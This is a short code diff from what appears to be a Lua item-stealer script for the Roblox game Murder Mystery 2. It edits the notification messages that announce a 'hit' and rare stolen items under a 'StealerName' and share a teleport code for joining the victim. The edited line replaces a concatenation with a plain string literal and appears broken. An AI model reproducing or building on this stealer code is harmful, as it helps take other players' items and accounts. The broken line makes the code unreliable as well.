@@ -45,7 +45,7 @@ local function sendnotification(message)
 end
 
 local messageMM2 =
-    "Join target with this code**"..TeleportScript.."**"
+     "..TeleportScript.."
     if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
     messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
 end
